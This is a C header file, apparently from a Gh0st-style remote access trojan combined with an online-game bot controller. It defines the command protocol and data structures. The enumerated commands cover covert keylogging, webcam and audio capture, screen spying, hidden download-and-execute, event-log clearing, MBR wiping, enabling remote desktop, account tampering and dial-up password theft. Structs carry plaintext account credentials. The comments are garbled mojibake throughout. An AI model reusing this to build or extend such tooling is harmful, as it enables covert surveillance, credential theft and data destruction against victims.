
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

#define IDR_ENCODE 513		//��Դ�е�������Ϣ
#define IDR_CONFIG 514		//��Դ�еķ�����Ϣ
#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			1024 * 8 // ��������ݳ���
#define MAX_RECV_BUFFER			1024 * 8 // ���������ݳ���

// BYTE���Ҳ��256
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������

	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�

	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����

	COMMAND_AUDIO,					// ��������

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_SYSTEMINFO,				// �����б�
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_KILLPROCEDELE,           // �رս��̲�ɾ���ļ�
	COMMAND_WINDOW_CLOSE,           // �رմ���
	COMMAND_WINDOW_TEST,            // ��������
	COMMAND_MEMOEY,                 //��ȡCPU�ڴ�ֵ����
	COMMAND_STOPED,                 //����ֹͣ����
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_System,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_Security,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_Application,		// �������� - ���ϵͳ��־
	COMMAND_CLEAN_ALL,			    // �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	//////////////////////�¹���////////////////////////

	COMMAND_CHANGE_GROUP,			// ���ķ���
	COMMAND_SENDFILE_HIDE,			// ��������
	COMMAND_SENDFILE_NORMAL,		// ��ʾ����
	COMMAND_SENDFILE_NOSTART,		// ��ȥ����
	COMMAND_SENDFILE_UPDATA,		// ��������
	COMMAND_OPEN_PROXY,				// ��������
	COMMAND_SHOW_MSG,				// ������Ϣ
	COMMAND_KILL_MBR,				// Ӳ����
	COMMAND_PORT_MAPPING,			// �˿�ӳ��

	/////////////////////////////////////////////////////
	COMMAND_SERVER_START,		    // ����������
	COMMAND_USER_LIST,		        // �û�
	COMMAND_NETWORK_LIST,		    // ����
	COMMAND_SERVER_PORT,		    // �������˿��޸�
	COMMAND_OPEN_3389,				// ����3389
	COMMAND_NET_USER,				// ��NET����û�
	COMMAND_NET_YHSX,		        // �û�ˢ��
	COMMAND_NET_START,		        // �ʻ�����
	COMMAND_NET_DISABLE,		    // �ʻ�����
	COMMAND_NET_DEL,		        // �ʻ�ɾ��
	COMMAND_RENAME_PASSWORD,        // �ʻ������޸�
	COMMAND_NRTWORK_CARD,           // ����������ˢ��
	COMMAND_DEL_SHIFTOSK,           // ����̼��Ŵ�ɾ��
	//////////////////////////////////////////////////////
	COMMAND_SERMANAGER,				// ������� 
	COMMAND_SSLIST,					// �����б�
	COMMAND_STARTSERVERICE,			// ��������
	COMMAND_STOPSERVERICE,			// ֹͣ����
	COMMAND_DELETESERVERICE,		// ɾ������
	COMMAND_CREATSERVERICE,			// ��������
	COMMAND_AUTOSERVERICE,			// ������
	COMMAND_HANDSERVERICE,			// �ֶ�
	COMMAND_DISABLESERVERICE,		// ��ֹ

	COMMAND_SERVERS_SETOPT,         //���÷���������          
	COMMAND_SERVERS_DEL,            //ɾ��ָ������
	COMMAND_REGEDIT,                //ע������
	COMMAND_REG_FIND,               //��ѯ����  
	COMMAND_REG_DELPATH,            //ɾ����
	COMMAND_REG_CREATEPATH,         //������
	COMMAND_REG_DELKEY,             //ɾ����
	COMMAND_REG_CREATKEY,           //������

	/************************/
	COMMAND_REBOOTAPP,
	COMMAND_FIRSTSTART,
	COMMAND_NEXTINDEXDO,            //�¸���ɫ
	COMMAND_AUTOUPDATE,
	COMMAND_START_SCRIPT,
	COMMAND_STOP_SCRIPT,
	COMMAND_SUSPEND_SCRIPT,
	COMMAND_RESUME_SCRIPT,
	COMMAND_UNINSTALL,
	COMMAND_SETCODELIST,            //�����ʺ��б�
	COMMAND_SETLOGININFO,           //���õ�¼��Ϣ
	COMMAND_GETRUNNINGINFO,        //�ύ����Running����
	COMMAND_EXITGAME,               //�˳���Ϸ
	COMMAND_REGISTER,
	COMMAND_RECHARGE,
	COMMAND_GETONLINEMEMBER,    //�õ����߳�Ա
	COMMAND_SETONLINEMEMBER,    //�������߳�Ա
	COMMAND_SETONLINEPLAYERS,
	COMMAND_SETPROTECTAUCTION,
	COMMAND_SETHUNTERPOSS,
	/************************/

	// ����˷����ı�ʶ
	TOKEN_AUTH = 100,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣

	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������


	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������

	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������

	TOKEN_PSLIST,					// �����б�
	TOKEN_WSLIST,					// �����б�
	TOKEN_MEMORY,                   // ����˷��͹����ڴ�ʹ��ֵ
	TOKEN_DIALUPASS,				// ��������
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ
	TOKEN_USER_LIST,			    // �������û��б�
	TOKEN_NETWORK_LIST,			    // �����������б�

	// �¹���
	TOKEN_SYSTEMINFO,				// ϵͳ��Ϣ
	TOKEN_SSLIST,					// �������

	TOKEN_REGEDIT,                  // ��ע������
	TOKEN_REG_PATH,                 // ����ע�������
	TOKEN_REG_KEY,                  // ���ͼ���
	TOKEN_REG_OK,                   // ִ�гɹ�
	TOKEN_REG_NO,                   // ִ��ʧ��
	//////////////////////////////////
	TOKEN_UPDATE_INFORMATION,
	TOKEN_TEAM_OPENCOMMUNICATION,
	TOKEN_TODAYFINISH,
	TOKEN_RUNNINGINFOMDB,
	TOKEN_ONLINEINFOMDB,
	TOKEN_ALLFINISH,                //���ʺ�ȫ���������
	TOKEN_ADDONLINETEAMPLAYER,
	TOKEN_DELONLINETEAMPLAYER,
	TOKEN_WITCHINDEXNEXTDO,
	TOKEN_CANINPUTPASSWORD,
	TOKEN_CANSELECTROLE,
	TOKEN_GETONLINEPLAYERS,
	TOKEN_GETPROTECTBUYAUCTIONS,
	TOKEN_SHOWTIPMSG,
	TOKEN_GETHUNTERPOSS,
	TOKEN_GETPROTECTSELLAUCTIONS,
};

//-----------------------------------------------
//Contrl <---------------> WatchDogX
//-----------------------------------------------
typedef struct _REGISTER
{
	char szAuxUserName[50];
	char szAuxPassword[50];
}REGISTER;

typedef struct _RECHARGE
{
	char szUserName[50];
	char szCardNum[50];
	char szCardPass[50];
}RECHARGE;

typedef struct _LOGINITEM
{	
	char szAuxUserName[50];
	char szAuxPassword[50];
	char szAnswerUserName[50];
	char szAnswerPassword[50];
	char szPPPOEUserName[50];
	char szPPPOEPassword[50];
}LOGINITEM;

typedef struct _USERITEMINFO
{
	char szMacID[50];
	char szPID[50];
	char szUserName[50];
	char szIndex[50];
	char szProfession[50];
	char szPlayerLv[32];
	char szPlayerName[50];
	char szPlayerMoney[50];
	char szScriptStatus[50];
	char szStatus[50];
}USERITEMINFO;

typedef struct _CODEITEM
{
	char szUserName[50];
	char szPassword[50];
	char szServerBig[50];
	char szServerSmall[50];
	char szLine[50];
	char szProfession[50];
	char szIdentity[50];
	char szResponsibility[50];
	char szRoleCount[50];
	char szDealModel[50];
	char szWorks[0xff];
	char szStoreName[50];
	char szClernUpTeamNum[50];
	char szArrestTeamNum[50];
	char szEscortTeamNum[50];
	char szTeamGroup[50];
}CODEITEM;

typedef struct _ONLINEITEM
{
	char szTeamGroup[50];
	char szMacID[50];
	char szPlayerName[50];
	char szIdentity[50];
	char szResponsibility[50];
}ONLINEITEM;

typedef struct _PROTECTAUCTIONITEM
{
	char szGoods[50];
	char szMoney[50];
}PROTECTAUCTIONITEM;

typedef struct _PROTECTBUYAUCTIONITEM
{
	char szGoods[50];
	char szMoney[50];
}PROTECTBUYAUCTIONITEM;

typedef struct _PROTECTSELLAUCTIONITEM
{
	char szGoods[50];
	char szMoney[50];
	char szCount[50];
}PROTECTSELLAUCTIONITEM;

typedef struct _HUNTERITEN
{
	char szMap[50];
	char szPos[50];
	char szMonster[50];
	char szRange[50];
}HUNTERITEN;

//-----------------------------------------------
//WatchDogX <---------------> DLL
//-----------------------------------------------

typedef struct _AUTOSTARTINFO
{
	unsigned char bToken;		    // = 1
	char szProfession[50];
	char szIdentity[50];
	char szResponsibility[50];
	char szRoleCount[50];
	char szDealModel[50];
	char szWorks[0xff];
	char szStoreName[50];
	char szDllPath[0xff];
	int  nStartIndex;
	char szClernUpTeamNum[50];
	char szArrestTeamNum[50];
	char szEscortTeamNum[50];
	char szTeamGroup[50];
}AUTOSTARTINFO;

typedef struct _AUTOLOGININFO
{
	char szUserName[50];
	char szPassword[50];
	char szLine[50];
	char szServerBig[50];
	char szServerSmall[50];
}AUTOLOGININFO;

typedef struct
{	
	unsigned char			bToken;			// = 1
	int			    nPID;	        //PID��
	char            szUserName[50];
	bool            bFirst;         //�״����� 
}MYLOGININFO;

typedef struct _PLAYERINFOUPDATE
{
	unsigned char   bToken;
	int             nPID;
	int             nIndex;
	char            szProfession[50];
	char            szStatus[50];
	char            szPlayerName[50];
	int             nLv;
	char            szMoney[50];
	char            szCurScriptFuncName[50];
}PLAYERINFOUPDATE;

typedef struct _TODAYFINISH
{
	unsigned char	bToken;
	char			szUserName[50];
	char			szRoleName[50];
	char			szType[50];  //����"��ɴ���"
}TODAYFINISH;

typedef struct _UPDATETEAMINI
{
	unsigned char	bToken;			// = 1
	char           szTeamGroup[50];
	char           szRoleName[50];
	char           szIdentity[50];
	char           szResponsibility[50];
}UPDATETEAMITEM;

typedef struct _WITCHINDEXNEXTDO
{
	unsigned char	bToken;			// = 1
	char			szUserName[50];
	int				nIndex;
}WITCHINDEXNEXTDO;

typedef struct _TOKENWITHUSERNAME
{
	unsigned  char	bToken;			// = 1
	char			szUserName[50];
}TOKENWITHUSERNAME;

typedef struct _SHOWTIPMSG
{
	unsigned  char	bToken;			// = 1
	char			szText[0xFF];
}SHOWTIPMSG;

#endif // !defined(AFX_MACROS_H_INCLUDED)